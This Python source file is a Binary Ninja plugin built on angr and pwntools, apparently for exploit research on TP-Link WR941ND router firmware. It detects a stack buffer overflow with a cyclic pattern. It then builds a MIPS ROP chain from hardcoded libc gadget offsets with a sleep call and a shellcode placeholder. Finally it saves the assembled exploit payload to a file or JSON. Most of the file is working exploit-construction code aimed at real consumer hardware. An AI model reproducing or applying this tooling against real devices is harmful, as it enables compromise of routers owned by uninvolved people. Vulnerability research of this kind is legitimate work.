import angr
import string
import claripy
import archinfo
import tempfile
import sys
from binaryninja.highlight import HighlightColor
from binaryninja.enums import HighlightStandardColor, MessageBoxButtonSet, MessageBoxIcon
from binaryninja.plugin import PluginCommand, BackgroundTaskThread, BackgroundTask
import binaryninja.interaction as interaction
from binaryninja.interaction import get_save_filename_input, show_message_box
import binaryninja as binja
from binaryninja import BinaryView, SectionSemantics
from abc import ABC, abstractmethod
import os
import json
import collections
import binascii
from pwn import *

BinaryView.set_default_session_data("find_list", set())

registers = {"mips32": ['a0', 'a1', 'a2', 'a3', 's0', 's1',
             's2', 's3', 's4', 's5', 's6', 's7',
             't0', 't1', 't2', 't3', 't4', 't5',
             't6', 't7', 't8', 't9', 'v0', 'v1',
             'sp', 'gp', 'pc', 'ra', 'fp']}


class Explorer(ABC):
    @abstractmethod
    def run(self):
        pass

    @abstractmethod
    def explore(self):
        pass

class MainExplorer(Explorer):

    @abstractmethod
    def run(self):
        pass

    @abstractmethod
    def explore(self):
        pass
    
    @abstractmethod
    def feed_function_state(self):
        pass
    
    @abstractmethod
    def set_pointers(self):
        pass
    @abstractmethod
    def set_sim_manager(self):
        pass
    
   

class UIPlugin():

    @classmethod
    def dump_regs(self, state, registers, *include):
        data = []
        if(len(include) > 0):
            data = [x for x in registers if x in include]
        else:
            data = registers
        for reg in data:
            binja.log_info("${0}: {1}".format(reg, state.regs.get(reg)))

    @classmethod
    def color_path(self, bv, addr):
        # Highlight the instruction in green
        blocks = bv.get_basic_blocks_at(addr)
        bv.session_data.find_list.add(addr)
        for block in blocks:
            block.set_auto_highlight(HighlightColor(
                HighlightStandardColor.GreenHighlightColor, alpha=128))
            block.function.set_auto_instr_highlight(
                addr, HighlightStandardColor.GreenHighlightColor)

    @classmethod
    def clear_color_path(self, bv):
        for addr in bv.session_data.find_list:
            blocks = bv.get_basic_blocks_at(addr)
            for block in blocks:
                block.set_auto_highlight(HighlightColor(
                    HighlightStandardColor.NoHighlightColor, alpha=128))
                block.function.set_auto_instr_highlight(
                    addr, HighlightStandardColor.NoHighlightColor)


class AngrRunner(BackgroundTaskThread):
    def __init__(self, bv, explorer):
        BackgroundTaskThread.__init__(
            self, "Vulnerability research with angr started...", can_cancel=True)
        self.bv = bv
        self.explorer = explorer

    def run(self):
        self.explorer.run()

    @classmethod
    def cancel(self, bv):
        UIPlugin.clear_color_path(bv)


class BackgroundTaskManager():
    def __init__(self, bv):
        self.runner = None
        self.vulnerability_explorer = None
        self.rop_explorer = None
        self.exploit_creator = None
        self.proj = None
        self.init = None
        self.libc_base = None
        self.payload = ''

    @classmethod
    def set_exploit_payload(self, init, payload):
        self.payload = payload
        self.init = init

    @classmethod
    def vuln_explore(self, bv):
        self.init = cyclic(300).encode()
        self.vulnerability_explorer = VulnerabilityExplorer(bv, 0x4703f0, 0x4706fc, ld_path='/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib')
        pointers = self.vulnerability_explorer.set_pointers(arg0=self.init)
        state = self.vulnerability_explorer.feed_function_state(pointers['arg0'])
        self.vulnerability_explorer.set_sim_manager(state)
        self.vulnerability_explorer.check_buffer_overflow(self.init)
        self.runner = AngrRunner(bv, self.vulnerability_explorer)
        self.runner.start()

    @classmethod
    def build_rop(self, bv):
        self.proj = angr.Project(bv.file.filename, ld_path=[
            '/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib'], use_system_libs=False)
        self.libc = self.proj.loader.shared_objects['libc.so.0']
        self.libc_base = self.libc.min_addr
        self.gadget1 = self.libc_base+0x00055c60
        self.gadget2 = self.libc_base+0x00024ecc
        self.gadget3 = self.libc_base+0x0001e20c
        self.gadget4 = self.libc_base+0x000195f4
        self.gadget5 = self.libc_base+0x000154d8
        self.sleep = self.libc_base + 0x00053ca0

        self.init = b"A"*160 + b"BBBB" + \
            p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
        self.rop_explorer = ROPExplorer(bv, self.proj, 0x4703f0, 0x4706fc, first=self.gadget1, second=self.gadget2,
                                        third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
        pointers = self.rop_explorer.set_pointers(arg0=self.init)
        state = self.rop_explorer.feed_function_state(pointers['arg0'])
        self.rop_explorer.set_sim_manager(state)
        self.runner = AngrRunner(bv, self.rop_explorer)
        self.runner.start()

    @classmethod
    def exploit_to_file(self, bv):
        self.exploit_creator = FileExploitCreator(bv, self.init, self.payload)
        self.runner = AngrRunner(bv, self.exploit_creator)
        self.runner.start()

    @classmethod
    def exploit_to_json(self, bv):
        self.json_exploit_creator = JSONExploitCreator(bv, self.init, self.payload)
        self.runner = AngrRunner(bv, self.json_exploit_creator)
        self.runner.start()

    @classmethod
    def stop(self, bv):
        self.runner.cancel(bv)


class VulnerabilityExplorer(MainExplorer):
    def __init__(self, bv, func_start_addr, func_end_addr, ld_path=None, use_system_libs=False):
        self.bv = bv
        self.func_start_addr = func_start_addr
        self.func_end_addr = func_end_addr
        self.proj = angr.Project(self.bv.file.filename, ld_path=[
            ld_path ], use_system_libs=use_system_libs)
        self.cfg = self.proj.analyses.CFGFast(regions=[(self.func_start_addr, self.func_end_addr)])
        self.pointers = {}
        self.init = None

        self.proj.hook(self.func_end_addr, self.explore)
    
    def explore(self, state):
        UIPlugin.color_path(self.bv, state.solver.eval(
            state.regs.pc, cast_to=int))
        if state.solver.eval(state.regs.pc, cast_to=int) == self.func_end_addr:
            UIPlugin.dump_regs(state, registers[self.bv.arch.name])
            return True

    def run(self):
        sm = self.simgr.explore(find=self.explore)
        test = sm.found
        if len(test) > 0:
            print(sm.found)
            found = sm.found[0]
            print("found", found)
            if self.init:
                self.identify_overflow(found, registers[self.bv.arch.name])

    def set_pointers(self, **pointers):
        if pointers is not None:
            for key, value in pointers.items():
                self.pointers[key] = angr.PointerWrapper(value)
        return self.pointers

    def feed_function_state(self, pointers=None, data=None):
        self.state = self.proj.factory.call_state(self.func_start_addr, pointers)
        return self.state
    
    def set_sim_manager(self, state):
         self.simgr = self.proj.factory.simgr(self.state)

    def check_buffer_overflow(self, payload):
        if payload:
            self.init = payload

    def identify_overflow(self, found, registers=[], silence=True, *exclude):
        data = []
        report = {}
        if(len(exclude) > 0):
            data = [x for x in registers if x not in exclude]
        else:
            data = registers
        for arg in data:
            reg = found.solver.eval(found.regs.get(arg), cast_to=bytes)
            if reg in self.init:
                if(arg == 'ra' and cyclic_find(reg.decode())):
                    binja.log_warn("[*] Buffer overflow detected !!!")
                    binja.log_warn(
                        "[*] We can control ${0} after {1} bytes !!!!".format(arg, cyclic_find(reg.decode())))
                    report[arg] = cyclic_find(reg.decode())
                else:
                    binja.log_warn(
                        "[+] Register ${0} overwritten after: {1} bytes".format(arg, cyclic_find(reg.decode())))
                    report[arg] = cyclic_find(reg.decode())
            else:
                if(not silence):
                    binja.log_info(
                        "[-] Register ${0} not overwrite by pattern".format(arg))
        if(bool(report)):
            interaction.show_markdown_report(
                "Vulnerability Info Report", self.get_vuln_report(report))

    def get_vuln_report(self, report):
        contents = "==== Vulnerability Report ====\r\n\n"
        for key, value in report.items():
            if(key == 'ra'):
                contents += "[*] Buffer overflow detected !!!\r\n\n"
                contents += "We can control ${0} after {1} bytes !!!!\r\n\n".format(
                    key, value)
            else:
                contents += "Register ${0} overwritten after {1} bytes !!!!\r\n\n".format(
                    key, value)
        return contents


class ROPExplorer(MainExplorer):
    def __init__(self, bv, project, func_start_addr, func_end_addr, **kwargs):
        self.bv = bv
        self.func_start_addr = func_start_addr
        self.func_end_addr = func_end_addr
        self.proj = project
        self.proj.analyses.CFGFast(regions=[(self.func_start_addr, self.func_end_addr)])
        self.init = None
        self.pointers={}
        self.gadget1 = kwargs['first']
        self.gadget2 = kwargs['second']
        self.gadget3 = kwargs['third']
        self.gadget4 = kwargs['fourth']
        self.gadget5 = kwargs['fifth']
        self.sleep = kwargs['sixth']
        self.state_history = collections.OrderedDict()
        self.payload = collections.OrderedDict()
    
        binja.log_info("Gadget 1 address: 0x{0:0x}".format(self.gadget1))
        binja.log_info("Gadget 2 address: 0x{0:0x}".format(self.gadget2))
        binja.log_info("Gadget 3 address: 0x{0:0x}".format(self.gadget3))
        binja.log_info("Sleep func address: 0x{0:0x}".format(self.sleep))
        binja.log_info("Gadget 4 address: 0x{0:0x}".format(self.gadget4))
        binja.log_info("Gadget 5 address: 0x{0:0x}".format(self.gadget5))

        self.proj.hook(self.func_end_addr, self.overwrite_ra)
        self.proj.hook(self.gadget1, self.hook_gadget1)
        self.proj.hook(self.gadget2, self.hook_gadget2)  # jalr $t9
        # lw $s1, 0x28($sp)
        self.proj.hook(self.gadget2+4, self.hook_gadget2next4)
        # lw $s0, 0x24($sp)
        self.proj.hook(self.gadget2+8, self.hook_gadget2next8)
        self.proj.hook(self.gadget3, self.hook_gadget3)  # mov $t9, $s1
        # lw $ra, 0x24($sp)
        self.proj.hook(self.gadget3+4, self.hook_gadget3next4)
        # lw $s2, 0x20($sp)
        self.proj.hook(self.gadget3+8, self.hook_gadget3next8)
        # lw $s1, 0x1c($sp)
        self.proj.hook(self.gadget3+12, self.hook_gadget3next12)
        # lw $s0, 0x18($sp)
        self.proj.hook(self.gadget3+16, self.hook_gadget3next16)
        self.proj.hook(self.gadget4, self.hook_gadget4)  # addiu $s0, $sp, 0x24
        self.proj.hook(self.gadget5+4, self.explore)  # jalr $
        
    def set_pointers(self, **pointers):
        if pointers is not None:
            for key, value in pointers.items():
                self.pointers[key] = angr.PointerWrapper(value)
        return self.pointers

    def feed_function_state(self, pointers=None, data=None):
        self.state = self.proj.factory.call_state(self.func_start_addr, pointers)
        return self.state
    
    def set_sim_manager(self, state):
         self.simgr = self.proj.factory.simgr(self.state)
    
    def get_rop_report(self, state, data, gadget):
        contents = "==== 0x{0:0x} Registers ====\r\n\n".format(gadget)
        for reg in data:
            contents += "${0}: 0x{1:0x}\r\n\n".format(
                reg, state.solver.eval(state.regs.get(reg), cast_to=int))
        return contents

    def get_stack_report(self, data):
        contents = "====Stack Data ====\r\n\n"
        for key, value in data.items():
            contents += "{0}: {1}\r\n\n".format(key.decode(),hex(u32(value, endian='big')))
        return contents

    def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
        if(size >= 0):
            for i in range(4, size+4, 4):
                state.memory.store(reg+i, state.solver.BVV(data, 32))
                self.payload[hex(reg+i).encode()] = data.encode()

    def overwrite_ra(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        UIPlugin.color_path(self.bv, pc)
        if pc == self.func_end_addr:
            self.state_history['init'] = state

    def hook_gadget1(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget1:
            self.state_history[hex(self.gadget1)] = state

    def hook_gadget2(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget2:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            self.stack_adjust(state, sp, 0x20, "EEEE")
            # lw $ra, 0x2c($sp)
            state.memory.store(sp+0x2c, state.solver.BVV(self.gadget3, 32))
            self.payload[hex(sp+0x2c).encode()] = p32(self.gadget3, endian='big')
            self.state_history[hex(self.gadget2)] = state

    def hook_gadget2next4(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget2+4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s1, 0x28($sp)
            state.memory.store(sp+0x28, state.solver.BVV(self.sleep, 32))
            self.payload[hex(sp+0x28).encode()] = p32(self.sleep, endian='big')

    def hook_gadget2next8(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget2+8:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s0, 0x24($sp)
            state.memory.store(sp+0x24, state.solver.BVV("DDDD", 32))
            self.payload[hex(sp+0x24).encode()] = b'DDDD'

    def hook_gadget3(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            self.stack_adjust(state, sp, 0x18, "GGGG")
            # gadget3 -> lw $s0, 0x18($sp) => 24 bytes
            self.state_history[hex(self.gadget3)] = state

    def hook_gadget3next4(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $ra, 0x24($sp)
            state.memory.store(sp+0x24, state.solver.BVV(self.gadget4, 32))
            self.payload[hex(sp+0x24).encode()] = p32(self.gadget4, endian='big')

    def hook_gadget3next8(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+8:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s2, 0x20($sp)
            state.memory.store(sp+0x20, state.solver.BVV("CCCC", 32))
            self.payload[hex(sp+0x20).encode()] = b'CCCC'

    def hook_gadget3next12(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+12:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s1, 0x1c($sp)
            state.memory.store(sp+0x1c, state.solver.BVV(self.gadget5, 32))
            self.payload[hex(sp+0x1c).encode()] = p32(self.gadget5, endian='big')

    def hook_gadget3next16(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+16:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s0, 0x18($sp)
            state.memory.store(sp+0x18, state.solver.BVV("FFFF", 32))
            self.payload[hex(sp+0x18).encode()] = b'FFFF'

    def hook_gadget4(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # addiu $s0, $sp, 0x24
            state.memory.store(sp+0x24, state.solver.BVV("SHEL", 32))
            self.payload[hex(sp+0x24).encode()] = b'SHEL'
            self.state_history[hex(self.gadget4)] = state

    def explore(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget5+4:
            return True

    def run(self):
        sm = self.simgr.explore(find=self.explore)
        test = sm.found
        if len(test) > 0:
            print(sm.found)
            found = sm.found[0]
            print("found", found)
            UIPlugin.dump_regs(found, registers[self.bv.arch.name])

        # Generate raport for gadgets

            interaction.show_markdown_report("Initial State", self.get_rop_report(
                self.state_history['init'], registers[self.bv.arch.name], self.func_end_addr))
            interaction.show_markdown_report("ROP Gadget 1", self.get_rop_report(
                self.state_history[hex(self.gadget1)], registers[self.bv.arch.name], self.gadget1))
            interaction.show_markdown_report("ROP Gadget 2", self.get_rop_report(
                self.state_history[hex(self.gadget2)], registers[self.bv.arch.name], self.gadget2))
            interaction.show_markdown_report("ROP Gadget 3", self.get_rop_report(
                self.state_history[hex(self.gadget3)], registers[self.bv.arch.name], self.gadget3))
            interaction.show_markdown_report("ROP Gadget 4", self.get_rop_report(
                self.state_history[hex(self.gadget4)], registers[self.bv.arch.name], self.gadget4))
            interaction.show_markdown_report("ROP Gadget 5", self.get_rop_report(
                found, registers[self.bv.arch.name], found.solver.eval(found.regs.pc, cast_to=int)))
            self.state_history[hex(self.gadget5)] = found

            sortedDict = collections.OrderedDict(sorted(self.payload.items()))
            print("Payload", sortedDict)
            interaction.show_markdown_report(
                'ROP Stack', self.get_stack_report(sortedDict))
            BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)


class FileExploitCreator(Explorer):
    def __init__(self, bv, init, payload):
        self.bv = bv
        self.init = init
        self.payload = payload

    def explore(self):
        pass

    def generate_exploit(self, payload):
        exploit = self.init
        for key, value in payload.items():
            exploit += value
        return exploit

    def run(self):
        exploit = self.generate_exploit(self.payload)
        prompt_file = get_save_filename_input('filename')
        if(not prompt_file):
            return
        print("exploit", exploit)
        file_exploit = open(prompt_file, 'wb')
        file_exploit.write(exploit)
        file_exploit.close()
        show_message_box("Exploit Creator", "Exploit saved to file",
                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)


class JSONExploitCreator(Explorer):
    def __init__(self, bv, init, payload):
        self.bv = bv
        self.init = init
        self.payload = payload

    def explore(self):
        pass

    def decode_from_bytes(self,data):
        decoded_dict = collections.OrderedDict()
        for k,v in data.items():
            decoded_dict[k.decode()] = u32(v)
        return decoded_dict

    def run(self):
        ordered_dict = self.decode_from_bytes(self.payload)
        ordered_dict['junk'] = binascii.hexlify(self.init[0:164]).decode()
        ordered_dict['second'] = u32(self.init[164:168])
        ordered_dict['first'] = u32(self.init[168:172])
        # self.payload['init']=self.init
        data = json.dumps(ordered_dict, ensure_ascii=False, indent=4)
        prompt_file = get_save_filename_input('filename', 'json')
        if(not prompt_file):
            return
        output_file = open(prompt_file.decode("utf-8")+'.json', 'w')
        output_file.write(data)
        output_file.close()
        show_message_box("Exploit Creator", "Exploit saved as JSON",
                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)


PluginCommand.register(
    "Angr\WR941ND\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
PluginCommand.register("Angr\WR941ND\Build ROP",
                       "Try to build exploit rop chain", BackgroundTaskManager.build_rop)
PluginCommand.register("Angr\WR941ND\Generate Exploit\Save as JSON",
                       "Try to save exploit as JSON", BackgroundTaskManager.exploit_to_json)
PluginCommand.register("Angr\WR941ND\Generate Exploit\Save to File",
                       "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)
PluginCommand.register(
    "Angr\WR941ND\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
